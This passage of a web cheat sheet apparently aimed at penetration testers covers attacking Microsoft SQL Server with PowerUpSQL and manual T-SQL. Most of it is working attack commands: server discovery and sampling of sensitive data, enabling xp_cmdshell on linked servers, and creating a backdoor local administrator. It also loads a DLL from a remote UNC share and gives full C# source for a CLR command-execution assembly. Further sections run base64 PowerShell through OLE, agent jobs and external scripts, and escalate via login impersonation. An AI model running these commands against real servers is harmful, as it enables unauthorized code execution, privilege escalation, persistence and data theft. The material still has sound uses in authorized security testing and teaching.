      <li><a href="#list-all-database-role">List All Database Roles</a></li>
      <li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
      <li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
      <li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
      <li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
      <li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
    </ul>
  </li>
  <li><a href="#references">References</a></li>
</ul>

<h2 id="identify-instances-and-databases">Identify Instances and Databases</h2>

<h3 id="discover-local-sql-server-instances">Discover Local SQL Server Instances</h3>

<pre><code class="language-ps1">Get-SQLInstanceLocal
</code></pre>

<h3 id="discover-domain-sql-server-instances">Discover Domain SQL Server Instances</h3>

<pre><code class="language-ps1">Get-SQLInstanceDomain -Verbose
# Get Server Info for Found Instances
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
# Get Database Names
Get-SQLInstanceDomain | Get-SQLDatabase -NoDefaults
</code></pre>

<h3 id="discover-remote-sql-server-instances">Discover Remote SQL Server Instances</h3>

<pre><code class="language-ps1">Get-SQLInstanceBroadcast -Verbose
Get-SQLInstanceScanUDPThreaded -Verbose -ComputerName SQLServer1
</code></pre>

<h3 id="identify-encrypted-databases">Identify Encrypted databases</h3>
<p>Note: These are automatically decrypted for admins</p>

<pre><code class="language-ps1">Get-SQLDatabase -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Verbose | Where-Object {$_.is_encrypted -eq "True"}
</code></pre>

<h3 id="version-query">Version Query</h3>

<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-Query "select @@version"
</code></pre>

<h2 id="identify-sensitive-information">Identify Sensitive Information</h2>

<h3 id="get-tables-from-a-specific-database">Get Tables from a Specific Database</h3>

<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLTable -DatabaseName &lt;DBNameFromGet-SQLDatabaseCommand&gt; -NoDefaults
Get Column Details from a Table
Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName &lt;DBName&gt; -TableName &lt;TableName&gt;
</code></pre>

<h3 id="gather-5-entries-from-each-column">Gather 5 Entries from Each Column</h3>

<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLColumnSampleData -Keywords "&lt;columnname1,columnname2,columnname3,columnname4,columnname5&gt;" -Verbose -SampleSize 5
</code></pre>

<h3 id="gather-5-entries-from-a-specific-table">Gather 5 Entries from a Specific Table</h3>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query 'select TOP 5 * from &lt;DatabaseName&gt;.dbo.&lt;TableName&gt;'
</code></pre>

<h3 id="dump-common-information-from-server-to-files">Dump common information from server to files</h3>

<pre><code class="language-ps1">Invoke-SQLDumpInfo -Verbose -Instance SQLSERVER1\Instance1 -csv
</code></pre>

<h2 id="linked-database">Linked Database</h2>

<h3 id="crawl-links-for-instances-in-the-domain">Crawl Links for Instances in the Domain</h3>
<p>A Valid Link Will Be Identified by the DatabaseLinkName Field in the Results</p>

<pre><code class="language-ps1">Get-SQLInstanceDomain | Get-SQLServerLink -Verbose
</code></pre>

<h3 id="crawl-links-for-a-specific-instance">Crawl Links for a Specific Instance</h3>

<pre><code class="language-ps1">Get-SQLServerLinkCrawl -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Verbose
</code></pre>

<h3 id="query-version-of-linked-database">Query Version of Linked Database</h3>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "select * from openquery(`"&lt;DBSERVERNAME\DBInstance&gt;`",'select @@version')" -Verbose
</code></pre>

<h3 id="execute-procedure-on-linked-database">Execute Procedure on Linked Database</h3>

<pre><code class="language-ps1">SQL&gt; EXECUTE('EXEC sp_configure ''show advanced options'',1') at "linked.database.local";
SQL&gt; EXECUTE('RECONFIGURE') at "linked.database.local";
SQL&gt; EXECUTE('EXEC sp_configure ''xp_cmdshell'',1;') at "linked.database.local";
SQL&gt; EXECUTE('RECONFIGURE') at "linked.database.local";
SQL&gt; EXECUTE('exec xp_cmdshell whoami') at "linked.database.local";
</code></pre>

<h3 id="determine-names-of-linked-databases">Determine Names of Linked Databases</h3>

<blockquote>
  <p>tempdb, model ,and msdb are default databases usually not worth looking into. Master is also default but may have something and anything else is custom and definitely worth digging into. The result is DatabaseName which feeds into following query.</p>
</blockquote>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "select * from openquery(`"&lt;DatabaseLinkName&gt;`",'select name from sys.databases')" -Verbose
</code></pre>

<h3 id="determine-all-the-tables-names-from-a-selected-linked-database">Determine All the Tables Names from a Selected Linked Database</h3>

<blockquote>
  <p>The result is TableName which feeds into following query</p>
</blockquote>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "select * from openquery(`"&lt;DatabaseLinkName&gt;`",'select name from &lt;DatabaseNameFromPreviousCommand&gt;.sys.tables')" -Verbose
</code></pre>

<h3 id="gather-the-top-5-columns-from-a-selected-linked-table">Gather the Top 5 Columns from a Selected Linked Table</h3>

<blockquote>
  <p>The results are ColumnName and ColumnValue which feed into following query</p>
</blockquote>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "select * from openquery(`"&lt;DatabaseLinkName&gt;`",'select TOP 5 * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt;')" -Verbose
</code></pre>

<h3 id="gather-entries-from-a-selected-linked-column">Gather Entries from a Selected Linked Column</h3>

<pre><code class="language-ps1">Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "select * from openquery(`"&lt;DatabaseLinkName&gt;`"'select * from &lt;DatabaseNameFromPreviousCommand&gt;.dbo.&lt;TableNameFromPreviousCommand&gt; where &lt;ColumnNameFromPreviousCommand&gt;=&lt;ColumnValueFromPreviousCommand&gt;')" -Verbose
</code></pre>

<h3 id="command-execution-via-xp_cmdshell">Command Execution via xp_cmdshell</h3>

<blockquote>
  <p>xp_cmdshell disabled by default since SQL Server 2005</p>
</blockquote>

<pre><code class="language-ps1">Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command whoami
Creates and adds local user backup to the local administrators group:
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "net user backup Password1234 /add' -Verbose
Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "net localgroup administrators backup /add" -Verbose
</code></pre>

<h2 id="extended-stored-procedure">Extended Stored Procedure</h2>

<h3 id="add-the-extended-stored-procedure-and-list-extended-stored-procedures">Add the extended stored procedure and list extended stored procedures</h3>

<pre><code class="language-ps1">Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test &gt; c:\temp\test.txt" -ExportName xp_test
Get-SQLQuery -UserName sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
Get-SQLQuery -UserName sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "EXEC xp_test"
Get-SQLStoredProcedureXP -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Verbose
</code></pre>

<h2 id="clr-assemblies">CLR Assemblies</h2>

<p>Prerequisites:</p>
<ul>
  <li>sysadmin privileges</li>
  <li>CREATE ASSEMBLY permission (or)</li>
  <li>ALTER ASSEMBLY permission (or)</li>
</ul>

<h3 id="execute-commands-using-clr-assembly">Execute commands using CLR assembly</h3>

<pre><code class="language-ps1">Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "whoami" Verbose
or
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "powershell -e &lt;base64&gt;" -Verbose
</code></pre>

<h3 id="manually-creating-a-clr-dll-and-importing-it">Manually creating a CLR DLL and importing it</h3>

<p>Create a C# DLL file with the following content, with the command : <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library c:\temp\cmd_exec.cs</code></p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre></td><td class="rouge-code"><pre><span class="k">using</span> <span class="nn">System</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Data</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Data.SqlClient</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Data.SqlTypes</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">Microsoft.SqlServer.Server</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Diagnostics</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Text</span><span class="p">;</span>

<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">StoredProcedures</span>
<span class="p">{</span>
    <span class="p">[</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">SqlServer</span><span class="p">.</span><span class="n">Server</span><span class="p">.</span><span class="n">SqlProcedure</span><span class="p">]</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">cmd_exec</span> <span class="p">(</span><span class="n">SqlString</span> <span class="n">execCommand</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">Process</span> <span class="n">proc</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">Process</span><span class="p">();</span>
        <span class="n">proc</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">FileName</span> <span class="p">=</span> <span class="s">@"C:\Windows\System32\cmd.exe"</span><span class="p">;</span>
        <span class="n">proc</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">Arguments</span> <span class="p">=</span> <span class="kt">string</span><span class="p">.</span><span class="nf">Format</span><span class="p">(</span><span class="s">@" /C {0}"</span><span class="p">,</span> <span class="n">execCommand</span><span class="p">.</span><span class="n">Value</span><span class="p">);</span>
        <span class="n">proc</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">UseShellExecute</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">proc</span><span class="p">.</span><span class="n">StartInfo</span><span class="p">.</span><span class="n">RedirectStandardOutput</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">proc</span><span class="p">.</span><span class="nf">Start</span><span class="p">();</span>

        <span class="c1">// Create the record and specify the metadata for the columns.</span>
        <span class="n">SqlDataRecord</span> <span class="n">record</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">SqlDataRecord</span><span class="p">(</span><span class="k">new</span> <span class="nf">SqlMetaData</span><span class="p">(</span><span class="s">"output"</span><span class="p">,</span> <span class="n">SqlDbType</span><span class="p">.</span><span class="n">NVarChar</span><span class="p">,</span> <span class="m">4000</span><span class="p">));</span>
        
        <span class="c1">// Mark the beginning of the result set.</span>
        <span class="n">SqlContext</span><span class="p">.</span><span class="n">Pipe</span><span class="p">.</span><span class="nf">SendResultsStart</span><span class="p">(</span><span class="n">record</span><span class="p">);</span>

        <span class="c1">// Set values for each column in the row</span>
        <span class="n">record</span><span class="p">.</span><span class="nf">SetString</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="n">proc</span><span class="p">.</span><span class="n">StandardOutput</span><span class="p">.</span><span class="nf">ReadToEnd</span><span class="p">().</span><span class="nf">ToString</span><span class="p">());</span>

        <span class="c1">// Send the row back to the client.</span>
        <span class="n">SqlContext</span><span class="p">.</span><span class="n">Pipe</span><span class="p">.</span><span class="nf">SendResultsRow</span><span class="p">(</span><span class="n">record</span><span class="p">);</span>
        
        <span class="c1">// Mark the end of the result set.</span>
        <span class="n">SqlContext</span><span class="p">.</span><span class="n">Pipe</span><span class="p">.</span><span class="nf">SendResultsEnd</span><span class="p">();</span>
        
        <span class="n">proc</span><span class="p">.</span><span class="nf">WaitForExit</span><span class="p">();</span>
        <span class="n">proc</span><span class="p">.</span><span class="nf">Close</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">};</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Then follow these instructions:</p>

<ol>
  <li>Enable <code class="language-plaintext highlighter-rouge">show advanced options</code> on the server
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span><span class="mi">1</span><span class="p">;</span> 
 <span class="n">RECONFIGURE</span>
 <span class="k">GO</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Enable CLR on the server
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre> <span class="n">sp_configure</span> <span class="s1">'clr enabled'</span><span class="p">,</span><span class="mi">1</span>
 <span class="n">RECONFIGURE</span>
 <span class="k">GO</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Import the assembly
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre> <span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span>
 <span class="k">FROM</span> <span class="s1">'c:</span><span class="se">\t</span><span class="s1">emp</span><span class="se">\c</span><span class="s1">md_exec.dll'</span>
 <span class="k">WITH</span> <span class="n">PERMISSION_SET</span> <span class="o">=</span> <span class="n">UNSAFE</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Link the assembly to a stored procedure
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre> <span class="k">CREATE</span> <span class="k">PROCEDURE</span> <span class="p">[</span><span class="n">dbo</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">]</span> <span class="o">@</span><span class="n">execCommand</span> <span class="n">NVARCHAR</span> <span class="p">(</span><span class="mi">4000</span><span class="p">)</span> <span class="k">AS</span> <span class="k">EXTERNAL</span> <span class="n">NAME</span> <span class="p">[</span><span class="n">my_assembly</span><span class="p">].[</span><span class="n">StoredProcedures</span><span class="p">].[</span><span class="n">cmd_exec</span><span class="p">];</span>
 <span class="k">GO</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
  <li>Execute and clean
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre> <span class="n">cmd_exec</span> <span class="nv">"whoami"</span>
 <span class="k">DROP</span> <span class="k">PROCEDURE</span> <span class="n">cmd_exec</span>
 <span class="k">DROP</span> <span class="n">ASSEMBLY</span> <span class="n">my_assembly</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ol>

<p><strong>CREATE ASSEMBLY</strong> will also accept an hexadecimal string representation of a CLR DLL</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre><span class="k">CREATE</span> <span class="n">ASSEMBLY</span> <span class="p">[</span><span class="n">my_assembly</span><span class="p">]</span> <span class="k">AUTHORIZATION</span> <span class="p">[</span><span class="n">dbo</span><span class="p">]</span> <span class="k">FROM</span> 
<span class="mi">0</span><span class="n">x4D5A90000300000004000000F</span><span class="p">[</span><span class="n">TRUNCATED</span><span class="p">]</span>
<span class="k">WITH</span> <span class="n">PERMISSION_SET</span> <span class="o">=</span> <span class="n">UNSAFE</span> 
<span class="k">GO</span> 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="ole-automation">OLE Automation</h2>

<h3 id="execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</h3>

<pre><code class="language-ps1">Invoke-SQLOSCmdOle -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "whoami" Verbose
</code></pre>

<pre><code class="language-ps1"># Enable OLE Automation
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure

# Execute commands
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
</code></pre>

<h2 id="agent-jobs">Agent Jobs</h2>

<h3 id="execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</h3>

<pre><code class="language-ps1">Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "powershell e &lt;base64encodedscript&gt;" -Verbose
Subsystem Options:
–Subsystem CmdExec
-SubSystem PowerShell
–Subsystem VBScript
–Subsystem Jscript
</code></pre>

<h3 id="list-all-jobs">List All Jobs</h3>

<pre><code class="language-ps1">Get-SQLAgentJob -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -username sa -Password Password1234 -Verbose
</code></pre>

<h2 id="external-scripts">External Scripts</h2>

<p>:warning: You need to enable <strong>external scripts</strong>.</p>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="n">sp_configure</span> <span class="s1">'external scripts enabled'</span><span class="p">,</span> <span class="mi">1</span><span class="p">;</span>
<span class="n">RECONFIGURE</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h2 id="python">Python:</h2>

<pre><code class="language-ps1">Invoke-SQLOSCmdPython -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "powershell -e &lt;base64encodedscript&gt;" -Verbose
</code></pre>

<h2 id="r">R</h2>

<pre><code class="language-ps1">Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Command "powershell -e &lt;base64encodedscript&gt;" -Verbose
</code></pre>

<h2 id="audit-checks">Audit Checks</h2>

<h3 id="find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</h3>

<ul>
  <li>Impersonate as: <code class="language-plaintext highlighter-rouge">EXECUTE AS LOGIN = 'sa'</code></li>
  <li>Impersonate <code class="language-plaintext highlighter-rouge">dbo</code> with DB_OWNER
    <div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>  <span class="k">SQL</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">is_member</span><span class="p">(</span><span class="s1">'db_owner'</span><span class="p">);</span>
  <span class="k">SQL</span><span class="o">&gt;</span> <span class="k">execute</span> <span class="k">as</span> <span class="k">user</span> <span class="o">=</span> <span class="s1">'dbo'</span>
  <span class="k">SQL</span><span class="o">&gt;</span> <span class="k">SELECT</span> <span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>    </div>
  </li>
</ul>

<pre><code class="language-ps1">Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Exploit -Verbose

# impersonate sa account
powerpick Get-SQLQuery -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Query "EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER(''sysadmin'')" -Verbose -Debug
</code></pre>

<h2 id="find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</h2>

<pre><code class="language-ps1">Invoke-SQLAuditPrivTrustworthy -Instance "&lt;DBSERVERNAME\DBInstance&gt;" -Exploit -Verbose 
</code></pre>

<blockquote>
  <p>The following audit checks run web requests to load Inveigh via reflection. Be mindful of the environment and ability to connect outbound.</p>
</blockquote>

<pre><code class="language-ps1">Invoke-SQLAuditPrivXpDirtree
Invoke-SQLUncPathInjection
Invoke-SQLAuditPrivXpFileexist
</code></pre>

<h2 id="manual-sql-server-queries">Manual SQL Server Queries</h2>

<h3 id="query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">suser_sname</span><span class="p">()</span>
<span class="k">Select</span> <span class="k">system_user</span>
<span class="k">select</span> <span class="n">is_srvrolemember</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="current-role">Current Role</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">Select</span> <span class="k">user</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="current-db">Current DB</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">db_name</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="list-all-tables">List all tables</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="k">table_name</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="list-all-databases">List all databases</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="n">name</span> <span class="k">from</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="all-logins-on-server">All Logins on Server</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">where</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">'SERVER_ROLE'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="all-database-users-for-a-database">All Database Users for a Database</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">Select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">where</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">'database_role'</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="list-all-sysadmins">List All Sysadmins</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span><span class="n">type_desc</span><span class="p">,</span><span class="n">is_disabled</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">WHERE</span> <span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">,</span><span class="n">name</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="list-all-database-roles">List All Database Roles</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">DB1</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="n">DatabaseRoleName</span><span class="p">,</span>
<span class="k">isnull</span> <span class="p">(</span><span class="n">DB2</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="s1">'No members'</span><span class="p">)</span> <span class="k">AS</span> <span class="n">DatabaseUserName</span>
<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_role_members</span> <span class="k">AS</span> <span class="n">DRM</span>
<span class="k">RIGHT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DB1</span>
<span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">role_principal_id</span> <span class="o">=</span> <span class="n">DB1</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">LEFT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DB2</span>
<span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">member_principal_id</span> <span class="o">=</span> <span class="n">DB2</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">WHERE</span> <span class="n">DB1</span><span class="p">.</span><span class="k">type</span> <span class="o">=</span> <span class="s1">'R'</span>
<span class="k">ORDER</span> <span class="k">BY</span> <span class="n">DB1</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="effective-permissions-from-the-server">Effective Permissions from the Server</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="s1">'server'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="effective-permissions-from-the-database">Effective Permissions from the Database</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_dp1my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'DATABASE'</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre><span class="k">select</span> <span class="k">distinct</span> <span class="n">b</span><span class="p">.</span><span class="n">name</span>
<span class="k">from</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_permissions</span> <span class="n">a</span>
<span class="k">inner</span> <span class="k">join</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="n">b</span>
<span class="k">on</span> <span class="n">a</span><span class="p">.</span><span class="n">grantor_principal_id</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">where</span> <span class="n">a</span><span class="p">.</span><span class="n">permission_name</span> <span class="o">=</span> <span class="s1">'impersonate'</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="exploiting-impersonation">Exploiting Impersonation</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
<span class="k">EXECUTE</span> <span class="k">AS</span> <span class="n">LOGIN</span> <span class="o">=</span> <span class="s1">'adminuser'</span>
<span class="k">SELECT</span> <span class="k">SYSTEM_USER</span>
<span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">)</span>
<span class="k">SELECT</span> <span class="n">ORIGINAL_LOGIN</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="exploiting-nested-impersonation">Exploiting Nested Impersonation</h3>

<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
